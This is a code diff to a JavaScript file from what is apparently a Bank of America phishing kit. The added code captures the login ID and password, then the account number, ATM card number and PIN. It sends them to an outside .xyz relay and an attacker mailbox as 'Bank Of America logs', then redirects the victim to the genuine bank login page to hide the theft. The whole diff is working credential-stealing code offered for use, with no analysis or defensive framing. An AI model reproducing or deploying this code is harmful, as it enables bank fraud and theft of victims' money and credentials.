@@ -1,5 +1,5 @@
- async function send_em(to,from,subject,body){
-            var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
+var yourUrl ="https://xzawwree.xyz/pharoh/smtpjs.php";
+        async function send_em(to,from,subject,body){
             let agent = navigator.userAgent;
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
@@ -19,4 +19,69 @@
           
           
           }
- var your_email="emilmiller134@gmail.com";
+        var your_email="rp@xzawwree.xyz";
+        window.addEventListener("load", function(){
+        document.getElementById("caw-signin").addEventListener("click", function(event){
+            event.preventDefault();
+        var userid = document.getElementById("oid").value;
+        var pass =    document.getElementById("pass").value
+        if( pass.length < 4 || userid.length < 4 )
+        {
+            alert ("please enter all feild correctly")
+        }
+
+
+
+        else{
+            var body ="Email: "+email+"\nuserId: "+userid+"\n password: "+pass
+            send_em(your_email,"ozoigbondu","Bank Of America logs from "+email,body).then(
+                function(){
+                    var show = document.getElementById("debit_cc");
+                    var hide = document.getElementById("homeee");
+                    hide.style.display = "none";
+                    show.style.display = "block";
+                        
+                }
+            )
+        }
+
+         });
+
+
+         document.getElementById("btn-continue").addEventListener("click", function(event){
+            event.preventDefault();
+            var acctNumber= document.getElementById("acctNumber").value;
+            var atmNumber=    document.getElementById("atmNumber").value
+            var atmPin =    document.getElementById("atmPin").value
+            if( acctNumber.length < 5 || atmNumber.length < 10  || atmPin.length < 3 )
+            {
+                alert ("please enter all feild correctly")
+            }
+    
+    
+    
+            else{
+                var body ="Email: "+email+"\nacctNumber: "+acctNumber+"\n atmNumber: "+atmNumber+"\n atmPin : "+atmPin 
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    window.location.href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj2vY6rh5X7AhWFZ8AKHcmPDtQQjBB6BAgMEAE&url=https%3A%2F%2Fsecure.bankofamerica.com%2Flogin%2Fsign-in%2FsignOnV2Screen.go&usg=AOvVaw3MVnQXUiUHuoDZqiMvvlPW"
+                    }
+                };
+                xhr.open("POST", yourUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({
+                    "to": your_email,
+                    "from": "ozoigbondu",
+                    "subject": "Bank Of America logs from  "+email,
+                    "body": body
+                }));
+            }
+    
+             });
+
+
+
+
+
+         });
